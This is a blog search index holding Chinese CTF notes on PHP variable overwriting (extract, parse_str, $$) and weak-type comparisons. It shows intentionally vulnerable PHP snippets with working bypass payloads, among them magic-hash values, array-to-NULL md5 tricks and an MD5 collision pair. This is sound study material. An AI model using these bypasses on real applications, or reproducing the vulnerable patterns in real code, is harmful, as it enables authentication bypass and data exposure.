<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>PHP变量覆盖</title>
    <link href="/2023/02/02/php_var_overrides/"/>
    <url>/2023/02/02/php_var_overrides/</url>
    
    <content type="html"><![CDATA[<p>通常将可以用自定义的参数替换原有变量值的情况称为变量覆盖漏洞。</p><p>经常导致变量覆盖漏洞的场景由：</p><ol><li>$$ 使用不当</li><li>extract() 使用不当</li><li>parse_str() 使用不当</li><li>开启全局变量注册 //PHP 5.3.0 后废弃</li></ol><h2 id="PHP变量覆盖"><a href="#PHP变量覆盖" class="headerlink" title="PHP变量覆盖"></a>PHP变量覆盖</h2><h3 id="使用不当"><a href="#使用不当" class="headerlink" title="$$ 使用不当"></a>$$ 使用不当</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-variable">$_403</span> = <span class="hljs-string">&quot;Access Denied&quot;</span>;<br><span class="hljs-variable">$_200</span> = <span class="hljs-string">&quot;Welcome Admin&quot;</span>;<br> <br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_METHOD&quot;</span>] != <span class="hljs-string">&quot;POST&quot;</span>)<br>     <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;BugsBunnyCTF is here :p…&quot;</span>);<br><span class="hljs-keyword">if</span> ( !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;flag&quot;</span>]) )<br>     <span class="hljs-keyword">die</span>(<span class="hljs-variable">$_403</span>);<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)<br>     <span class="hljs-variable">$$key</span> = <span class="hljs-variable">$$value</span>;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)<br>     <span class="hljs-variable">$$key</span> = <span class="hljs-variable">$value</span>;<br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;flag&quot;</span>] !== <span class="hljs-variable">$flag</span> )<br>     <span class="hljs-keyword">die</span>(<span class="hljs-variable">$_403</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;This is your flag : &quot;</span>. <span class="hljs-variable">$flag</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">die</span>(<span class="hljs-variable">$_200</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>两个 foreach 中都使用了$$，这里就可以使用flag覆盖$_200</p><p>POST flag 等于任何值都可以通过15行的判断</p><p>Payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">GET</span> DATA：?<span class="hljs-attribute">_200</span>=flag <br>POST DATA：<span class="hljs-attribute">flag</span>=anything<br></code></pre></td></tr></table></figure><h3 id="extract-使用不当"><a href="#extract-使用不当" class="headerlink" title="extract() 使用不当"></a>extract() 使用不当</h3><p><strong>extract()</strong>：将<strong>键和值</strong>注册成<strong>变量和值</strong></p><p>EXTR_PREFIX_SAME设置是如果变量冲突，就加上后面的前缀也就是dup，所以变量a不变，产生新的变量dup_a被赋值为cat</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;Original&quot;</span>;<br><span class="hljs-variable">$my_array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;Cat&quot;</span>, <span class="hljs-string">&quot;b&quot;</span> =&gt; <span class="hljs-string">&quot;Dog&quot;</span>, <span class="hljs-string">&quot;c&quot;</span> =&gt; <span class="hljs-string">&quot;Horse&quot;</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$my_array</span>, EXTR_PREFIX_SAME, <span class="hljs-string">&quot;dup&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\$a = <span class="hljs-subst">$a</span>; \$b = <span class="hljs-subst">$b</span>; \$c = <span class="hljs-subst">$c</span>; \$dup_a = <span class="hljs-subst">$dup_a</span>&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br><br>output:<br><span class="hljs-variable">$a</span> = Original; <span class="hljs-variable">$b</span> = Dog; <span class="hljs-variable">$c</span> = Horse; <span class="hljs-variable">$dup_a</span> = Cat<br><br></code></pre></td></tr></table></figure><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p>假如 <code>$shiyan</code> 的值等于文件的内容 <code>$content</code> 时，就打印出flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>); <br> <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$shiyan</span>)) &#123; <br>    <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$flag</span>)); <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$shiyan</span> == <span class="hljs-variable">$content</span>) &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>; <br>    &#125;<span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;Oh.no&#x27;</span>; <br>    &#125; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>同时传入 shiyan 和 flag 为空。使取文件错误，$content 为false（但实验出错）</p><p>这里还可以只传入shiyan为空。flag不传值，也会使文件读取错误，$content 为false</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?shiyan=&amp;flag=<br>?shiyan<br></code></pre></td></tr></table></figure><h3 id="parse-str-使用不当"><a href="#parse-str-使用不当" class="headerlink" title="parse_str() 使用不当"></a>parse_str() 使用不当</h3><p><strong>parse_str(string,array)</strong> ：<strong>查询字符串解析到变量中</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-string">&quot;name=Bill&amp;age=60&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$name</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$age</span>;<br><br>output: <br>Bill <span class="hljs-number">60</span><br></code></pre></td></tr></table></figure><h4 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>])) &#123;<br>   <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>   <span class="hljs-keyword">die</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>   <span class="hljs-keyword">include</span> (<span class="hljs-string">&quot;flag.php&quot;</span>);<br>    <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;www.OPENCTF.com&quot;</span>;<br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>];<br>    @<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$id</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] != <span class="hljs-string">&quot;QNKCDZO&quot;</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;QNKCDZO&quot;</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;其实很简单其实并不难！&quot;</span>);<br>    &#125;<br>&#125;<br> <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=a[<span class="hljs-number">0</span>]=s878926199a <br></code></pre></td></tr></table></figure><h2 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$_</span>=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$__</span>,<span class="hljs-variable">$___</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$__</span>==<span class="hljs-variable">$___</span>?<span class="hljs-variable">$___</span>:<span class="hljs-variable">$__</span>;<br>&#125;;<br><span class="hljs-comment">//定义了一个函数$_，对于传入$__,$___ 两个参数进行弱比较，相等则返回$___，不相等则返回$__</span><br><br><span class="hljs-variable">$$__</span>(<span class="hljs-variable">$_</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-variable">$___</span>&#125;[<span class="hljs-variable">$____</span>]&#123;<span class="hljs-variable">$_____</span>&#125;(),<span class="hljs-variable">$flag</span>));<br></code></pre></td></tr></table></figure><p>令<code>$__ == print_r</code> <code>$_($_GET&#123;$___&#125;[$____]&#123;$_____&#125;() == phpinfo()</code></p><p>phpinfo() 与 $flag 都是字符串，能通过弱类型比较。</p><p>Payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?__=x&amp;x=print_r&amp;____=a&amp;_____=b&amp;___=y&amp;y[a][b]=phpinfo<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>PHP</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP弱类型</title>
    <link href="/2023/02/02/php_weak_type/"/>
    <url>/2023/02/02/php_weak_type/</url>
    
    <content type="html"><![CDATA[<p>又是老生常谈的东西了，写文章主要是归档总结一下。</p><h2 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h2><p>PHP是弱类型语言，创建变量的时候不需要执行类型。使用时自动识别。</p><p>比较两个值是否相等时可以使用 <code>==</code> 或 <code>===</code> ：</p><p><code>$a == b</code> <strong>等于TRUE</strong>，如果类型转换后<code>$a</code>等于<code>$b</code></p><p><code>$a === b</code> <strong>全等TRUE</strong>，如果<code>$a</code>等于<code>$b</code>并且它们的类型也相等</p><p>在等于TRUE下会自动发生这些转换：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&#x27;&#x27;</span> == <span class="hljs-number">0</span> == <span class="hljs-literal">false</span><br><span class="hljs-string">&#x27;123&#x27;</span> == <span class="hljs-number">123</span><br><span class="hljs-string">&#x27;abc&#x27;</span> == <span class="hljs-number">0</span><br><span class="hljs-string">&#x27;123a&#x27;</span> = <span class="hljs-number">123</span><br><span class="hljs-string">&#x27;0x01&#x27;</span> == <span class="hljs-number">1</span><br><span class="hljs-string">&#x27;0e123456789&#x27;</span> == <span class="hljs-string">&#x27;0e987654321&#x27;</span><br>[<span class="hljs-literal">false</span>] == [<span class="hljs-number">0</span>] == [<span class="hljs-literal">NULL</span>] = [<span class="hljs-string">&#x27;&#x27;</span>]<br><span class="hljs-literal">NULL</span> == <span class="hljs-literal">false</span> == <span class="hljs-number">0</span><br><span class="hljs-literal">true</span> == <span class="hljs-number">1</span><br><span class="hljs-number">2022</span> = <span class="hljs-number">202.2e1</span> <span class="hljs-comment">//科学计数法</span><br></code></pre></td></tr></table></figure><h2 id="常见套路"><a href="#常见套路" class="headerlink" title="常见套路"></a>常见套路</h2><h3 id="弱类型MD5碰撞"><a href="#弱类型MD5碰撞" class="headerlink" title="弱类型MD5碰撞"></a>弱类型MD5碰撞</h3><p><code>0e</code> 开头的值在 <code>==</code> 判断相等时会被视为0，所以如果两个不同的密码经过哈希以后，其哈希值都是<code>0e</code>开头的话，那么PHP将会认为它们相等。</p><p>如果数据库中存在这种哈希值以 <code>0</code> 开头的密码的话，就可以以这个用户的身份轻易地登录进去。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">0e830400451993494058024219903391</span>QNKCDZO<span class="hljs-comment">//MD5   //原值</span><br><span class="hljs-number">0e545993274517709034328855841020</span>s878926199a<br></code></pre></td></tr></table></figure><h4 id="例题：-bugku-md5-加密相等绕过"><a href="#例题：-bugku-md5-加密相等绕过" class="headerlink" title="例题： bugku- md5 加密相等绕过"></a>例题： bugku- md5 加密相等绕过</h4><p>我们需要传入一个变量  a，这个变量 a 的要求是经过 md5 加密之后和 “QNKCDZO” 的加密结果相同。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$md51</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>);<br><span class="hljs-variable">$a</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$md52</span> = @<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="hljs-variable">$md51</span> == <span class="hljs-variable">$md52</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&#123;*&#125;&quot;</span>;<br>      &#125; <br>      <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;false!!!&quot;</span>;<br>      &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please input a&quot;</span>;&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?a=s878926199a<br></code></pre></td></tr></table></figure><h3 id="全等MD5绕过"><a href="#全等MD5绕过" class="headerlink" title="全等MD5绕过"></a>全等MD5绕过</h3><p>第一个 if 语句，如果 username 和 password 2 个变量相等会导致无法获得 flag。但是第二个 if 语句又要求 username 变量和 password 变量经过 md5() 函数加密的结果相同。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;test&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br>            <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Your password can not be your username.&#x27;</span>;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br>      <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Invalid password&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>注意此时遇到的是  <code>===</code> ，弱类型不起作用了。不过 md5 函数在传入数组时会报错返回 NULL ，当 2 个变量都导致报错返回 NULL 时就能使使得条件成立。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?username[]=<span class="hljs-number">1</span>&amp;password[]=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="真实MD5碰撞"><a href="#真实MD5碰撞" class="headerlink" title="真实MD5碰撞"></a>真实MD5碰撞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br></code></pre></td></tr></table></figure><p>真实md5碰撞，由于string()函数，不能输入数组只能输入字符串</p><p>Payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a=%<span class="hljs-number">4</span>d%c9%<span class="hljs-number">68</span>%ff%<span class="hljs-number">0</span>e%e3%<span class="hljs-number">5</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">95</span>%<span class="hljs-number">72</span>%d4%<span class="hljs-number">77</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">72</span>%<span class="hljs-number">15</span>%<span class="hljs-number">87</span>%d3%<span class="hljs-number">6</span>f%a7%b2%<span class="hljs-number">1</span>b%dc%<span class="hljs-number">56</span>%b7%<span class="hljs-number">4</span>a%<span class="hljs-number">3</span>d%c0%<span class="hljs-number">78</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">7</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">18</span>%af%bf%a2%<span class="hljs-number">00</span>%a8%<span class="hljs-number">28</span>%<span class="hljs-number">4</span>b%f3%<span class="hljs-number">6</span>e%<span class="hljs-number">8</span>e%<span class="hljs-number">4</span>b%<span class="hljs-number">55</span>%b3%<span class="hljs-number">5</span>f%<span class="hljs-number">42</span>%<span class="hljs-number">75</span>%<span class="hljs-number">93</span>%d8%<span class="hljs-number">49</span>%<span class="hljs-number">67</span>%<span class="hljs-number">6</span>d%a0%d1%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%<span class="hljs-number">83</span>%<span class="hljs-number">60</span>%fb%<span class="hljs-number">5</span>f%<span class="hljs-number">07</span>%fe%a2&amp;b=%<span class="hljs-number">4</span>d%c9%<span class="hljs-number">68</span>%ff%<span class="hljs-number">0</span>e%e3%<span class="hljs-number">5</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">95</span>%<span class="hljs-number">72</span>%d4%<span class="hljs-number">77</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">72</span>%<span class="hljs-number">15</span>%<span class="hljs-number">87</span>%d3%<span class="hljs-number">6</span>f%a7%b2%<span class="hljs-number">1</span>b%dc%<span class="hljs-number">56</span>%b7%<span class="hljs-number">4</span>a%<span class="hljs-number">3</span>d%c0%<span class="hljs-number">78</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">7</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">18</span>%af%bf%a2%<span class="hljs-number">02</span>%a8%<span class="hljs-number">28</span>%<span class="hljs-number">4</span>b%f3%<span class="hljs-number">6</span>e%<span class="hljs-number">8</span>e%<span class="hljs-number">4</span>b%<span class="hljs-number">55</span>%b3%<span class="hljs-number">5</span>f%<span class="hljs-number">42</span>%<span class="hljs-number">75</span>%<span class="hljs-number">93</span>%d8%<span class="hljs-number">49</span>%<span class="hljs-number">67</span>%<span class="hljs-number">6</span>d%a0%d1%d5%<span class="hljs-number">5</span>d%<span class="hljs-number">83</span>%<span class="hljs-number">60</span>%fb%<span class="hljs-number">5</span>f%<span class="hljs-number">07</span>%fe%a2<br></code></pre></td></tr></table></figure><p>值不等，md5相等即可。md5碰撞。</p><h3 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$num</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$num</span>))<br>&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-variable">$num</span>;<br>      <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag&#123;**********&#125;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>第一个if语句需要is_numeric()判断变量不是数字，第二个if语句需要$num==1，看似无解但可以通过弱类型绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?num=<span class="hljs-number">1</span>test<br></code></pre></td></tr></table></figure><h3 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h3><p>需要传入一个字符串变量 password，返回 flag 的条件是 password 的值和 number 变量的值相等。但是在判断两个变量是否相等之前，代码要先遍历 password 字符串，如果字符串中的字符转换为 ASCII 在 0 ~ 9 之间就会返回错误。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">noother_says_correct</span>(<span class="hljs-params"><span class="hljs-variable">$temp</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;test&#125;&#x27;</span>;<br>    <span class="hljs-variable">$one</span> = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-string">&#x27;1&#x27;</span>);    <span class="hljs-comment">//ord — 返回字符的 ASCII 码值</span><br>    <span class="hljs-variable">$nine</span> = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-string">&#x27;9&#x27;</span>);<br>    <span class="hljs-variable">$number</span> = <span class="hljs-string">&#x27;3735929054&#x27;</span>;<br>    <span class="hljs-comment">// Check all the input characters!</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$number</span>); <span class="hljs-variable">$i</span>++)<br>    &#123;<br>          <span class="hljs-comment">// Disallow all the digits!</span><br>          <span class="hljs-variable">$digit</span> = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$temp</span>&#123;<span class="hljs-variable">$i</span>&#125;);<br>          <span class="hljs-keyword">if</span> ( (<span class="hljs-variable">$digit</span> &gt;= <span class="hljs-variable">$one</span>) &amp;&amp; (<span class="hljs-variable">$digit</span> &lt;= <span class="hljs-variable">$nine</span>) )<br>          &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;flase&quot;</span>;<br>          &#125;<br>    &#125;<br>       <span class="hljs-keyword">if</span>(<span class="hljs-variable">$number</span> == <span class="hljs-variable">$temp</span>)<br>             <span class="hljs-keyword">return</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-variable">$temp</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">noother_says_correct</span>(<span class="hljs-variable">$temp</span>);<br></code></pre></td></tr></table></figure><p>只要 password 的数值和 number 相等即可，可以通过进制转换来绕过。传入的 password 是 <code>3735929054</code> 的其他进制的即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?password = <span class="hljs-number">0</span>xpassword<br></code></pre></td></tr></table></figure><h3 id="数组返回-NULL-绕过"><a href="#数组返回-NULL-绕过" class="headerlink" title="数组返回 NULL 绕过"></a>数组返回 NULL 绕过</h3><p>第一个 if 语句使用了 ereg() 